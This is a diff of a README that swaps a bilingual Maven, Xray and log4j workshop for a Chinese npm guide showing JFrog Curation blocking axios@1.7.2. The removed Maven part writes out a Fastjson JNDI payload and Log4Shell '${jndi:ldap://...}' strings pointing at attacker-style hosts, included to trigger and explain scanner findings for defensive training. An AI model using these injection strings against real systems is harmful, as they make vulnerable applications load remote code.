@@ -1,572 +1,358 @@
-# JFrog POC Samples
+# NPM + Curation Workshop Guide (Customer)
 
-This repository contains sample projects and customer training workshop materials for the JFrog Platform (Artifactory, Xray, Curation, etc.). It covers building, deploying, and security scanning across technologies such as Maven, Docker, NPM, Go, .NET, and Python.
+目标：在客户本机完成一次 **npm 构建 + 发布 build-info**，并演示 **JFrog Curation 阻断“恶意版本” axios** 的下载。
 
 ---
 
-<details open>
-<summary>English</summary>
+## 0) 你需要准备
 
-## Workshop Objectives
+- JFrog Cloud 试用账号：`https://jfrog.com/start-free/`
+- 本机已安装（最少 3 个工具）：
+  - JFrog CLI（`jf`）
+  - Git（`git`）
+  - Node.js 20.x LTS（含 `npm`）
 
-Welcome to the **JFrog SaaS Trial Workshop!** 🎓  
+### 安装
 
-**By the end of this workshop, you will be able to:**
+- **安装 JFrog CLI**
+  - 打开：`https://jfrog.com/getcli/`
+  - 按页面选择你的 OS 下载/安装
 
-1. **Apply for a JFrog SaaS trial** and set up your environment (repos, Xray, CLI).
-2. **Clone and configure** the Maven sample project and connect it to your Artifactory repos.
-3. **Build and deploy** the project using JFrog CLI and publish build info.
-4. **Understand and remediate** security vulnerabilities using JFrog Xray (scan, review, block, fix).
+- **安装 Node.js 20.x LTS（含 npm）**
+  - 打开：`https://nodejs.org/`，选择 **LTS（20.x）** 安装包
+  - **Windows 提示**：安装向导建议勾选 “Add to PATH”（安装后重新打开一个新的 PowerShell/CMD 再执行 `node -v`）
+  - （macOS + Homebrew 可选）
+    ```bash
+    brew install node@20
+    brew link --force --overwrite node@20
+    ```
 
-## Quick Operation Guide (Steps Overview)
+验证：
 
-| Step | Action |
-|------|--------|
-| 1 | Apply for JFrog SaaS trial; select region (e.g. Singapore/Tokyo). |
-| 2 | Clone this repo and go to `maven-sample`. |
-| 3 | Create Maven local/remote/virtual repos in Artifactory. |
-| 4 | Enable Xray indexing for the repos and build pattern `**/*`. |
-| 5 | Install & configure JFrog CLI (`jf c add`), then Maven (`jf mvnc`). |
-| 6 | Build & deploy: `jf mvn clean install` / `jf mvn deploy` / `jf rt bp`. |
-| 7 | Verify artifacts and build info in Artifactory. |
-| 8 | Review Xray findings, then use Curation to block vulnerable version and fix (e.g. log4j). |
-| 9 | Rebuild and confirm the issue is resolved. |
-
-## 📝 Prerequisites
-
-### JDK 17 Installation
-1. **Install JDK**
-   - Download and install JDK from [OpenJDK](https://jdk.java.net/archive/)
-   - Select JDK 17 (LTS) version
-   - Choose the appropriate package for your operating system:
-     - Windows: `.zip` archive
-     - macOS: `.tar.gz` archive
-   - For Windows:
-     - Extract the `.zip` to a directory like `C:\Program Files\Java\jdk-17`
-   - For macOS:
-     - Extract the `.tar.gz` to `/Library/Java/JavaVirtualMachines/`
-
-### Set Environment Variables
-
-#### JAVA_HOME
-1. Open System Properties (Win + S → "Environment Variables")
-2. Click "Environment Variables" → "New" under System variables
-3. Set:
-   ```
-   Variable name: JAVA_HOME
-   Variable value: C:\Program Files\Java\jdk-17
-   ```
-4. In System variables, select "Path" → "Edit"
-5. Click "New" and add:
-   ```
-   %JAVA_HOME%\bin
-   ```
-6. Click "OK" to save
-
-### Verify Installation
-   ```bash
-   # Check Java version
-   java -version
-   ```
-   Expected output:
-   ```
-   openjdk version "17.0.2" 2022-01-18
-   OpenJDK Runtime Environment (build 17.0.2+8)
-   OpenJDK 64-Bit Server VM (build 17.0.2+8, mixed mode, sharing)
-   ```
-
-### Maven 3.6.3
-1️⃣ **Download Maven**
-   - Go to [Apache Maven download page](https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.zip )
-   - Download the Binary zip archive (e.g., `apache-maven-3.6.3-bin.zip`)
-2️⃣ **Extract Maven**
-   - Extract the downloaded ZIP file to a directory, e.g.:
-     ```
-     C:\Program Files\Apache\Maven
-     ```
-   - Your Maven folder structure should look like:
-     ```
-     C:\Program Files\Apache\Maven\apache-maven-3.6.3
-     ```
-#### MAVEN_HOME Environment variables
-1. In System variables, click "New"
-2. Set:
-   ```
-   Variable name: MAVEN_HOME
-   Variable value: C:\Program Files\Apache\Maven\apache-maven-3.6.3
-   ```
-3. In "Path" variable, click "Edit"
-4. Click "New" and add:
-   ```
-   %MAVEN_HOME%\bin
-   ```
-5. Click "OK" on all windows to save
-
-> **Note:** After setting environment variables, you need to open a new Command Prompt for the changes to take effect.
-
-#### Verify Installation
-   ```bash
-   # Open a new Command Prompt and run:
-   mvn -version
-   ```
-   Expected output:
-   ```
-   Apache Maven 3.6.3 (...)
-   Maven home: C:\Program Files\Apache\Maven\apache-maven-3.6.3
-   Java version: 17.0.2, vendor: Oracle Corporation
-   Java home: C:\Program Files\Java\jdk-17
-   Default locale: en_US, platform encoding: UTF-8
-   OS name: "windows 10", version: "10.0", arch: "amd64", family: "windows"
-   ```
-
-## 🚀 Getting Started
-
-### 1. Apply for JFrog SaaS Trial
-1. [Apply for JFrog SaaS Trial](https://jfrog.com/start-free/)  
-   Select "14-Day Free Trial", it will give you your own JFrog Platform.
-   ![Trial signup](images/trial.png)
-
-2. **Select AWS Region**
-   - Choose either AWS Singapore or Tokyo region
-   - This will provide better network performance for users in Asia
-   - The region selection is available during the trial signup process
-
-3. You will get an email containing the login credentials for the JFrog platform
-
-### 2. Clone the Project
 ```bash
-git clone https://github.com/JFrogChina/jfrog-poc-samples.git
-cd jfrog-poc-samples/maven-sample
+jf --version
+git --version
+node -v
+npm -v
 ```
-
-### 3. Create Maven Repositories
-![Create Maven Repositories](images/img_6.png)
-1. Log in to JFrog SaaS Platform
-2. Click **Quick Repository Creation** (top-right)
-3. Select **Maven** and create:
-   - Local Repo: `sample-libs-snapshot-local` `sample-libs-release-local`
-   - Remote Repo: `sample-maven-remote`
-   - Virtual Repo: `sample-libs-snapshot` `sample-libs-release`
-
-### 4. Enable Xray Scanning
-1. Go to **Administrator -> Xray Settings → Index Resource**
-2. Add to indexed Repository:
-   - Repositories: `sample-libs-snapshot-local` `sample-libs-release-local`
-3. Configure Index Build by Pattern:
-   - Click Manage builds -> By Pattern
-   - Input the rule as below: `**/*`
-   - Click the + button
-   - This will scan all builds in the system
-     ![Index Build Pattern](images/img_8.png)
-
-### 5. Configure JFrog CLI
-1. [Download JFrog CLI](https://jfrog.com/getcli/)
-2. Configure your environment:
-   ```shell
-   jf c add saas
-   ```
-   This command will:
-   - Add a new JFrog configuration named 'saas'
-   - Prompt you to enter your JFrog platform details
-   - Store your credentials securely
-   - Set up the connection to your JFrog SaaS instance
-
-   Follow prompts to enter:
-   - JFrog Platform URL: `https://<YOUR_DOMAIN>.jfrog.io`
-   - username
-   - password
-
-### 6. Configure Maven
-```shell
-cd maven-sample
-jf mvnc
-```
-This generates a `.jfrog/projects/maven.yaml` pointing to your SaaS repositories.
-
-### 7. Build and Deploy
-
-Add the code below into the file DemoApplication.java -> main() under jfrog-poc-samples\maven-sample\src\main\java\com\example\jfrog\demo, to call the log4j vulnerable function.
-```
-    public static void main(String[] args) {
-        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
-        JSON jsonObject = JSON.parseObject(payload);
-        logger.info(jsonObject.toString());
-        logger.error("${jndi:ldap://somesitehackerofhell.com/z}");
-
-    }
-```
-
-```shell
-jf mvn clean install -f pom.xml --build-name=sample-maven-build --build-number=1
-jf mvn deploy --build-name=sample-maven-build --build-number=1
-jf rt bp sample-maven-build 1
-```
-
-### 8. Verify Deployment
-- Check **Artifactory → Artifacts** for deployed files
-- View build info in **Builds** section
-
-### Understanding log4j Vulnerability
-The log4j vulnerability (CVE-2021-44228) is detected because your project uses log4j-core 2.14.0. However, it's only exploitable when:
-
-1. Using vulnerable logging patterns:
-   ```java
-   // Vulnerable
-   logger.info("${jndi:ldap://malicious-server/exploit}");
-   
-   // Safe
-   logger.info("User logged in: {}", username);
-   ```
-
-2. **AND** when:
-   - Logging user-controlled input
-   - Input contains `${jndi:ldap://...}` pattern
-   - Application has network access to malicious server
-
-This explains why Xray shows many false positives - vulnerabilities exist in code but aren't exploitable in your use case.
-
-### 9. Remediate log4j Vulnerability
-
-#### 9.1 Review Vulnerability
-JFrog Advanced Security has identified this log4j package as a true positive. You can view the detailed evidence in the security report.
-![Review Vulnerability](images/img_1.png)
-
-#### Review the False Positive Results
-![False Positive Results](images/img_5.png)
-> **86% of critical/high vulnerabilities are false positives**
-
-![Vulnerability Statistics](images/img_4.png)
-
-#### 9.2 Block Vulnerable Version
-![Block Vulnerable Version](images/img_7.png)
-1. **Create Block Condition:**  
-   Administrator → Curation Settings → Create Condition  
-   ![Create Condition](images/img.png)
-
-2. **Create Policy:**  
-   ![Create Policy](images/img_2.png)
-
-3. **Clean Cache:**
-   ```bash
-   rm -rf ~/.m2/repository/org/apache/logging/log4j/*
-   ```
-
-4. **Verify Block:**
-   ```shell
-   [main] ERROR org.apache.maven.cli.MavenCli - Failed to execute goal on project app-boot: Could not resolve dependencies for project com.example.jfrog:app-boot:war:1.0.2: Could not transfer artifact org.apache.logging.log4j:log4j-core:jar:2.14.0 from/to artifactory-release (https://demo.jfrogchina.com/artifactory/alex-maven): authorization failed for https://demo.jfrogchina.com/artifactory/alex-maven/org/apache/logging/log4j/log4j-core/2.14.0/log4j-core-2.14.0.jar, status: 403 Forbidden -> [Help 1]
-   ```
-   ![Verify Block](images/img_3.png)
-
-5. **Fix: Update log4j Version**
-   ```xml
-   <dependency>
-       <groupId>org.apache.logging.log4j</groupId>
-       <artifactId>log4j-core</artifactId>
-       <version>2.17.1</version>
-   </dependency>
-   ```
-
-6. **Rebuild:**
-   ```shell
-   jf mvn clean
-   jf mvn deploy --build-name=sample-maven-build --build-number=2
-   jf rt bp sample-maven-build 2
-   ```
-
-The build should be successful and the issue was fixed.
-
-7. **Analysis of Vulnerability Fixing Trends:**
-Platform → Xray → Scan List → Builds
-![Build list](images/buildList.png)
-
-The build should complete successfully, confirming that the security issue has been fixed.
-
-> **Happy building and stay secure! 🚀**
-
-</details>
-
-<details>
-<summary>繁體中文</summary>
-
-## 工作坊目標
-
-歡迎參加 **JFrog SaaS 試用工作坊！** 🎓  
-
-**完成本工作坊後，您將能夠：**
-
-1. **申請 JFrog SaaS 試用**並完成環境設置（倉庫、Xray、CLI）。
-2. **克隆並配置** Maven 示例項目，並連接到您的 Artifactory 倉庫。
-3. **使用 JFrog CLI** 構建、部署項目並發布構建資訊。
-4. **理解並修復** 安全漏洞：使用 JFrog Xray 掃描、審查、阻擋並修復（如 log4j）。
-
-## 操作指導摘要
-
-| 步驟 | 操作 |
-|------|------|
-| 1 | 申請 JFrog SaaS 試用；選擇區域（如新加坡/東京）。 |
-| 2 | 克隆本倉庫並進入 `maven-sample`。 |
-| 3 | 在 Artifactory 中建立 Maven 本地/遠程/虛擬倉庫。 |
-| 4 | 為倉庫啟用 Xray 索引，並設定構建模式 `**/*`。 |
-| 5 | 安裝並配置 JFrog CLI（`jf c add`），再配置 Maven（`jf mvnc`）。 |
-| 6 | 構建與部署：`jf mvn clean install` / `jf mvn deploy` / `jf rt bp`。 |
-| 7 | 在 Artifactory 中驗證制品與構建資訊。 |
-| 8 | 查看 Xray 結果，使用 Curation 阻擋易受攻擊版本並修復（如 log4j）。 |
-| 9 | 重新構建並確認問題已解決。 |
-
-## 📝 前置需求
-
-### JDK 17 安裝
-1. **安裝 JDK**
-   - 從 [OpenJDK](https://jdk.java.net/archive/) 下載並安裝 JDK
-   - 選擇 JDK 17 (LTS) 版本
-   - 選擇適合您作業系統的套件：
-     - Windows：`.zip` 壓縮檔
-     - macOS：`.tar.gz` 壓縮檔
-   - Windows 系統：
-     - 解壓 `.zip` 到目錄，如 `C:\Program Files\Java\jdk-17`
-   - macOS 系統：
-     - 解壓 `.tar.gz` 到 `/Library/Java/JavaVirtualMachines/`
-
-### 設置環境變數
-
-#### JAVA_HOME
-1. 打開系統屬性（Win + S → "環境變數"）
-2. 點擊"環境變數" → 在系統變數下點擊"新建"
-3. 設置：
-   ```
-   變數名稱：JAVA_HOME
-   變數值：C:\Program Files\Java\jdk-17
-   ```
-4. 在系統變數中，選擇"Path" → "編輯"
-5. 點擊"新建"並添加：
-   ```
-   %JAVA_HOME%\bin
-   ```
-6. 點擊"確定"保存
-
-### 驗證安裝
-   ```bash
-   # 檢查 Java 版本
-   java -version
-   ```
-   預期輸出：
-   ```
-   openjdk version "17.0.2" 2022-01-18
-   OpenJDK Runtime Environment (build 17.0.2+8)
-   OpenJDK 64-Bit Server VM (build 17.0.2+8, mixed mode, sharing)
-   ```
-
-### Maven 3.6.3
-1️⃣ **下載 Maven**
-   - 訪問 [Apache Maven 下載頁面](https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.zip )
-   - 下載二進制 zip 檔案（例如：`apache-maven-3.6.3-bin.zip`）
-2️⃣ **解壓 Maven**
-   - 將下載的 ZIP 檔案解壓到目錄，例如：
-     ```
-     C:\Program Files\Apache\Maven
-     ```
-   - 您的 Maven 資料夾結構應該如下：
-     ```
-     C:\Program Files\Apache\Maven\apache-maven-3.6.3
-     ```
-#### MAVEN_HOME 環境變數
-1. 在系統變數中，點擊"新建"
-2. 設置：
-   ```
-   變數名稱：MAVEN_HOME
-   變數值：C:\Program Files\Apache\Maven\apache-maven-3.6.3
-   ```
-3. 在"Path"變數，點擊"編輯"
-4. 點擊"新建"並添加：
-   ```
-   %MAVEN_HOME%\bin
-   ```
-5. 點擊所有視窗的"確定"保存
-
-> **注意：** 設置環境變數後，您需要打開新的命令提示字元才能使更改生效。
-
-#### 驗證安裝
-   ```bash
-   # 打開新的命令提示字元並運行：
-   mvn -version
-   ```
-   預期輸出：
-   ```
-   Apache Maven 3.6.3 (...)
-   Maven home: C:\Program Files\Apache\Maven\apache-maven-3.6.3
-   Java version: 17.0.2, vendor: Oracle Corporation
-   Java home: C:\Program Files\Java\jdk-17
-   Default locale: en_US, platform encoding: UTF-8
-   OS name: "windows 10", version: "10.0", arch: "amd64", family: "windows"
-   ```
-
-## 🚀 開始使用
-
-### 1. 申請 JFrog SaaS 試用
-1. [申請 JFrog SaaS 試用](https://jfrog.com/start-free/)  
-   選擇"14 天免費試用"，它將為您提供自己的 JFrog 平台。
-   ![Trial signup](images/trial.png)
-
-2. **選擇 AWS 區域**
-   - 選擇 AWS 新加坡或東京區域
-   - 這將為亞洲用戶提供更好的網絡性能
-   - 區域選擇在試用註冊過程中可用
-
-3. 您將收到一封包含 JFrog 平台登入憑證的電子郵件
-
-### 2. 克隆項目
-```bash
-git clone https://github.com/JFrogChina/jfrog-poc-samples.git
-cd jfrog-poc-samples/maven-sample
-```
-
-### 3. 創建 Maven 倉庫
-![Create Maven Repositories](images/img_6.png)
-1. 登入 JFrog SaaS 平台
-2. 點擊**快速倉庫創建**（右上角）
-3. 選擇 **Maven** 並創建：
-   - 本地倉庫：`sample-libs-snapshot-local` `sample-libs-release-local`
-   - 遠程倉庫：`sample-maven-remote`
-   - 虛擬倉庫：`sample-libs-snapshot` `sample-libs-release`
-
-### 4. 啟用 Xray 掃描
-1. 轉到 **管理員 -> Xray 設置 → 索引資源**
-2. 添加到索引倉庫：
-   - 倉庫：`sample-libs-snapshot-local` `sample-libs-release-local`
-3. 配置構建索引模式：
-   - 點擊 Manage builds -> By Pattern
-   - 輸入規則如下：`**/*`
-   - 點擊 + 按鈕
-   - 這將掃描系統中的所有構建
-     ![Index Build Pattern](images/img_8.png)
-
-### 5. 配置 JFrog CLI
-1. [下載 JFrog CLI](https://jfrog.com/getcli/)
-2. 配置您的環境：
-   ```shell
-   jf c add saas
-   ```
-   此命令將：
-   - 添加一個名為 'saas' 的新 JFrog 配置
-   - 提示您輸入 JFrog 平台詳細信息
-   - 安全存儲您的憑證
-   - 設置與您的 JFrog SaaS 實例的連接
-
-   按照提示輸入：
-   - JFrog 平台 URL：`https://<YOUR_DOMAIN>.jfrog.io`
-   - 用戶名
-   - 密碼
-
-### 6. 配置 Maven
-```shell
-cd maven-sample
-jf mvnc
-```
-這將生成指向您的 SaaS 倉庫的 `.jfrog/projects/maven.yaml`。
-
-### 7. 構建與部署
-```shell
-jf mvn clean install -f pom.xml --build-name=sample-maven-build --build-number=1
-jf mvn deploy --build-name=sample-maven-build --build-number=1
-jf rt bp sample-maven-build 1
-```
-
-### 8. 驗證部署
-- 在 **Artifactory → Artifacts** 中檢查已部署的文件
-- 在 **Builds** 部分查看構建信息
-
-### Understanding log4j Vulnerability
-檢測到 log4j 漏洞（CVE-2021-44228）是因為您的項目使用了 log4j-core 2.14.0。但是，只有在以下情況下才會被利用：
-
-1. 使用易受攻擊的日誌模式：
-   ```java
-   // 易受攻擊
-   logger.info("${jndi:ldap://malicious-server/exploit}");
-   
-   // 安全
-   logger.info("User logged in: {}", username);
-   ```
-
-2. **並且**當：
-   - 記錄用戶控制的輸入
-   - 輸入包含 `${jndi:ldap://...}` 模式
-   - 應用程序可以訪問惡意服務器
-
-這解釋了為什麼 Xray 顯示許多誤報 - 代碼中存在漏洞，但在您的使用場景中無法被利用。
-
-### 9. 修復 log4j 漏洞
-
-#### 9.1 審查漏洞
-JFrog 高級安全已將此 log4j 包識別為真實漏洞。您可以在安全報告中查看詳細證據。
-![Review Vulnerability](images/img_1.png)
-
-#### 審查誤報結果
-![False Positive Results](images/img_5.png)
-> **86% 的嚴重/高風險漏洞是誤報**
-
-![Vulnerability Statistics](images/img_4.png)
-
-#### 9.2 阻止易受攻擊的版本
-![Block Vulnerable Version](images/img_7.png)
-1. **創建阻止條件：**  
-   管理員 → 策展設置 → 創建條件  
-   ![Create Condition](images/img.png)
-
-2. **創建策略：**  
-   ![Create Policy](images/img_2.png)
-
-3. **清理緩存：**
-   ```bash
-   rm -rf ~/.m2/repository/org/apache/logging/log4j/*
-   ```
-
-4. **驗證阻止：**
-   ```shell
-   [main] ERROR org.apache.maven.cli.MavenCli - Failed to execute goal on project app-boot: Could not resolve dependencies for project com.example.jfrog:app-boot:war:1.0.2: Could not transfer artifact org.apache.logging.log4j:log4j-core:jar:2.14.0 from/to artifactory-release (https://demo.jfrogchina.com/artifactory/alex-maven): authorization failed for https://demo.jfrogchina.com/artifactory/alex-maven/org/apache/logging/log4j/log4j-core/2.14.0/log4j-core-2.14.0.jar, status: 403 Forbidden -> [Help 1]
-   ```
-   ![Verify Block](images/img_3.png)
-
-5. **修復：更新 log4j 版本**
-   ```xml
-   <dependency>
-       <groupId>org.apache.logging.log4j</groupId>
-       <artifactId>log4j-core</artifactId>
-       <version>2.17.1</version>
-   </dependency>
-   ```
-
-6. **重新構建：**
-   ```shell
-   jf mvn clean
-   jf mvn deploy --build-name=sample-maven-build --build-number=2
-   jf rt bp sample-maven-build 2
-   ```
-
-構建應該成功，問題已修復。
-
-7. **漏洞修復趨勢分析：**
-平台 → Xray → 掃描列表 → 構建
-![構建列表](images/buildList.png)
-
-構建應該成功完成，確認安全問題已修復。
-
-> **祝您構建愉快，保持安全！🚀**
-
-</details>
 
 ---
 
-## 本倉庫其他示例
+## 1) 登录 JFrog
 
-| 目錄 | 說明 |
-|------|------|
-| `maven-sample` | Maven 構建、部署與 Xray/Curation 演示（本 Workshop 主流程） |
-| `docker-sample` | Docker 鏡像構建與推送到 Artifactory |
-| `npm-sample` | NPM 項目與 JFrog CLI |
-| `go-sample` | Go 模組構建與發布 |
-| `dotnet-sample` | .NET 項目與 Artifactory |
-| `python-sample` | Python/pip 與 PyPI 倉庫 |
-| `Xray-best-practices` | Xray 報告導出、Curation 等最佳實踐 |
-| `oss-governence` | 開源包治理與策略 |
-| `azure-devops-integration` | Azure DevOps 與 JFrog 整合 |
-| `cloudbees-jenkins-integration` | Jenkins/CloudBees 與 JFrog 整合 |
+先登录 JFrog trial 平台并获取 Access Token。
+
+参考官方文档：
+- Access Tokens：`https://docs.jfrog.com/administration/docs/access-tokens`
+- JFrog CLI Configuration：`https://docs.jfrog.com/integrations/docs/configuring-the-cli`
+
+在 JFrog Platform UI 中：
+1. 打开你的 JFrog trial 地址，例如：`https://<your-company>.jfrog.io`
+2. 进入 Administration → User Management → Access Tokens
+3. 创建一个当前用户可用的 Access Token
+4. 复制 token 并妥善保存，后续 CLI 登录会用到
+
+然后用一条命令配置 JFrog CLI。Server ID 固定为 `Artifactory`。
+
+Windows PowerShell：
+
+```powershell
+$env:JFROG_URL = "https://<your-company>.jfrog.io"
+$env:JFROG_ACCESS_TOKEN = "<your-access-token>"
+
+jf c add Artifactory --url=$env:JFROG_URL --access-token=$env:JFROG_ACCESS_TOKEN --interactive=false
+```
+
+macOS / Linux：
+
+```bash
+JFROG_URL="https://<your-company>.jfrog.io"
+JFROG_ACCESS_TOKEN="<your-access-token>"
+
+jf c add Artifactory --url="$JFROG_URL" --access-token="$JFROG_ACCESS_TOKEN" --interactive=false
+```
+
+验证：
+
+```bash
+jf c show
+jf rt ping
+```
+
+后续命令统一使用 Server ID：`Artifactory`。如果看到 `Server ID 'Artifactory' does not exist`，说明登录步骤没有成功创建 `Artifactory` 这个配置名，请重新执行上面的 `jf c add Artifactory ...` 命令。
+
+---
+
+## 2) 拉取 workshop 代码
+
+```bash
+cd ~
+git clone https://github.com/alexwang66/jfrog-workshop.git
+cd jfrog-workshop
+```
+
+---
+
+## 3) 一键创建 workshop 仓库（推荐）
+
+在本项目自带脚本目录执行：
+
+Windows PowerShell：
+
+```powershell
+cd ~/jfrog-workshop/automation
+.\create-repo.ps1
+```
+
+如果 PowerShell 执行策略阻止脚本运行，可在当前终端临时放开后重试：
+
+```powershell
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+.\create-repo.ps1
+```
+
+macOS / Linux：
+
+```bash
+cd ~/jfrog-workshop/automation
+chmod +x ./create-repo.sh
+./create-repo.sh all
+```
+
+脚本默认会创建（示例）：
+- resolve：`workshop-npm-virtual`（virtual）
+- remote：`workshop-npm-remote`（remote，指向 npmjs）
+- deploy：`workshop-npm-dev-local`（local）
+
+---
+
+## 4) NPM：通过 Artifactory 安装、发布包、发布 build-info
+
+进入示例目录。
+
+Windows PowerShell：
+
+```powershell
+cd ~/jfrog-workshop/npm-sample
+Get-Content .\package.json
+```
+
+macOS / Linux：
+
+```bash
+cd ~/jfrog-workshop/npm-sample
+cat ./package.json
+```
+
+后续所有 `npm` 和 `jf npm ...` 命令都必须在 `npm-sample` 目录执行。不要在 `automation` 目录执行这些命令；`automation` 只用于创建 JFrog 仓库。
+
+配置 npm 解析/部署到你刚创建的仓库：
+
+Windows PowerShell：
+
+```powershell
+jf npm-config `
+  --server-id-resolve=Artifactory `
+  --server-id-deploy=Artifactory `
+  --repo-resolve=workshop-npm-virtual `
+  --repo-deploy=workshop-npm-dev-local `
+  --global=false
+```
+
+macOS / Linux：
+
+```bash
+jf npm-config \
+  --server-id-resolve=Artifactory \
+  --server-id-deploy=Artifactory \
+  --repo-resolve=workshop-npm-virtual \
+  --repo-deploy=workshop-npm-dev-local \
+  --global=false
+```
+
+清理本地安装结果、`package-lock.json` 和 npm 缓存，确保依赖重新通过 JFrog Artifactory 解析：
+
+Windows PowerShell：
+
+```powershell
+Remove-Item -Recurse -Force node_modules, package-lock.json -ErrorAction SilentlyContinue
+npm cache clean --force
+Test-Path .\package-lock.json
+```
+
+`Test-Path .\package-lock.json` 输出 `False` 表示 lock 文件已删除。
+
+macOS / Linux：
+
+```bash
+rm -rf node_modules package-lock.json
+npm cache clean --force
+test ! -f ./package-lock.json && echo "package-lock.json removed"
+```
+
+执行安装/发布，并发布 build-info：
+
+Windows PowerShell：
+
+```powershell
+$env:BUILD_NAME = "npm-sample"
+$env:BUILD_NUMBER = "1"
+
+jf npm install --build-name=$env:BUILD_NAME --build-number=$env:BUILD_NUMBER
+jf npm publish --build-name=$env:BUILD_NAME --build-number=$env:BUILD_NUMBER
+
+jf rt build-add-git $env:BUILD_NAME $env:BUILD_NUMBER
+jf rt build-collect-env $env:BUILD_NAME $env:BUILD_NUMBER
+jf rt build-publish $env:BUILD_NAME $env:BUILD_NUMBER
+```
+
+macOS / Linux：
+
+```bash
+BUILD_NAME=npm-sample
+BUILD_NUMBER=1
+
+jf npm install --build-name="$BUILD_NAME" --build-number="$BUILD_NUMBER"
+jf npm publish --build-name="$BUILD_NAME" --build-number="$BUILD_NUMBER"
+
+jf rt build-add-git "$BUILD_NAME" "$BUILD_NUMBER"
+jf rt build-collect-env "$BUILD_NAME" "$BUILD_NUMBER"
+jf rt build-publish "$BUILD_NAME" "$BUILD_NUMBER"
+```
+
+在 UI 查看：
+- Artifactory → Builds → `npm-sample` → `#1`
+
+---
+
+## 5) Curation 演示：把 `axios@1.7.2` 当作“恶意版本”并阻断下载
+
+本 workshop **假设**：`axios@1.7.2` 是恶意版本，目标是让 `npm install` 在解析到该版本时被 Curation 阻断。
+
+### 5.1 确保项目依赖了这个版本
+
+在 `~/jfrog-workshop/npm-sample/package.json` 确保有这一行（若不同请修改）：
+
+- `"axios": "1.7.2"`
+
+然后清理并准备重新安装。这里必须删除 `package-lock.json`，否则 npm 可能直接按 lock 文件判断依赖已满足，Curation 阻断不容易被观察到：
+
+Windows PowerShell：
+
+```powershell
+cd ~/jfrog-workshop/npm-sample
+Remove-Item -Recurse -Force node_modules, package-lock.json -ErrorAction SilentlyContinue
+npm cache clean --force
+Test-Path .\package-lock.json
+```
+
+`Test-Path .\package-lock.json` 输出 `False` 表示 lock 文件已删除。
+
+macOS / Linux：
+
+```bash
+cd ~/jfrog-workshop/npm-sample
+rm -rf node_modules package-lock.json
+npm cache clean --force
+test ! -f ./package-lock.json && echo "package-lock.json removed"
+```
+
+### 5.2 在 JFrog UI 创建 Curation Policy（阻断 axios@1.7.2）
+
+这里需要 **先创建 Custom Condition**，再用它创建 Policy。
+
+#### 5.2.1 创建 Custom Condition（customer condition）
+
+参考官方文档：`https://docs.jfrog.com/security/docs/create-custom-conditions`
+
+在 JFrog UI：
+- Administration → Curation Settings → **Conditions**
+- 右上角 **Create Condition**
+- 选择模板：**Block Specific Package Versions**
+- 配置：
+  - Package type：`npm`
+  - Package：`axios`
+  - Version：`1.7.2`
+- Save
+
+#### 5.2.2 创建 Policy 并应用到 npm remote
+
+在 JFrog UI：
+- Administration → Curation → **Policies Management**
+- Create Policy：
+  - Scope：选择 **Specific remote repositories**（选 `workshop-npm-remote`）
+  - Condition：选择刚创建的 custom condition（axios 1.7.2）
+  - Action：**Block**
+- Save
+
+确保 Curation 对该 remote 生效（UI 入口因版本略有不同）：
+- Administration → Curation → Remote Repositories（或类似页面）
+- 找到 `workshop-npm-remote`，确保启用 Curation
+
+> UI 入口名称可能随版本略有不同，以你实例的实际菜单为准。
+
+### 5.3 清理 Artifactory remote cache 中已缓存的 axios
+
+如果 `axios@1.7.2` 在创建 Curation Policy 之前已经被下载过，Artifactory 可能已经把它缓存到了 remote cache。需要先删除这个缓存，再重新执行本地 npm 清理和安装。
+
+参考官方文档：
+- Remote Repositories：`https://docs.jfrog.com/artifactory/docs/remote-repositories`
+- Managing Artifacts：`https://docs.jfrog.com/artifactory/docs/managing-artifacts`
+
+在 JFrog UI：
+1. 进入 Artifactory → Artifacts
+2. 找到 remote cache 仓库：`workshop-npm-remote-cache`
+3. 在该仓库中找到 `axios`
+4. 右键 `axios`，选择 Delete / Delete Content
+5. 确认删除
+
+
+### 5.4 重新执行 install，观察被阻断
+
+Windows PowerShell：
+
+```powershell
+cd ~/jfrog-workshop/npm-sample
+Remove-Item -Recurse -Force node_modules, package-lock.json -ErrorAction SilentlyContinue
+npm cache clean --force
+
+$env:BUILD_NAME = "npm-curation"
+$env:BUILD_NUMBER = "2"
+
+jf npm install --build-name=$env:BUILD_NAME --build-number=$env:BUILD_NUMBER
+jf rt build-add-git $env:BUILD_NAME $env:BUILD_NUMBER
+jf rt build-collect-env $env:BUILD_NAME $env:BUILD_NUMBER
+jf rt build-publish $env:BUILD_NAME $env:BUILD_NUMBER
+```
+
+macOS / Linux：
+
+```bash
+cd ~/jfrog-workshop/npm-sample
+rm -rf node_modules package-lock.json
+npm cache clean --force
+
+BUILD_NAME=npm-curation
+BUILD_NUMBER=2
+
+jf npm install --build-name="$BUILD_NAME" --build-number="$BUILD_NUMBER"
+jf rt build-add-git "$BUILD_NAME" "$BUILD_NUMBER"
+jf rt build-collect-env "$BUILD_NAME" "$BUILD_NUMBER"
+jf rt build-publish "$BUILD_NAME" "$BUILD_NUMBER"
+```
+
+期望现象：
+- CLI 输出显示某个依赖版本被阻断（axios@1.7.2）
+- 安装失败或被替换为允许版本（取决于你 policy 的动作与配置）
+- 如果 install 成功，Builds 中可以查看 `npm-curation` → `#2` 的 build-info
+
+如果输出类似 `added 28 packages`，说明 npm 已经成功安装依赖，Curation 没有阻断本次下载。请检查：
+- Policy 是否已经保存并启用
+- Policy action 是否是 **Block**，而不是 Dry Run / Audit-only
+- Policy scope 是否选中了 `workshop-npm-remote`
+- Administration → Curation → Remote Repositories 中，`workshop-npm-remote` 是否是 Connected / Curated 状态
+- `workshop-npm-remote` 是否启用了 Xray indexing；官方 On-Demand Curation 文档建议同时确认 remote repository 已启用 Curation 和 Xray indexing
+- Custom Condition 是否准确配置为 Package type：`npm`，Package：`axios`，Version：`1.7.2`
+- 本地是否已经删除 `node_modules`、`package-lock.json` 并执行 `npm cache clean --force`
+- Artifactory → Artifacts → `workshop-npm-remote-cache` 中的 `axios` 是否已经删除；删除后刷新页面确认 `axios` 不再存在
+- Curation 的 audit/event 页面是否出现本次下载事件。如果没有事件，通常说明 repository 没有被 Curation 接管；如果事件结果是 No Policy Violation，通常说明 policy condition/scope/action 没有匹配
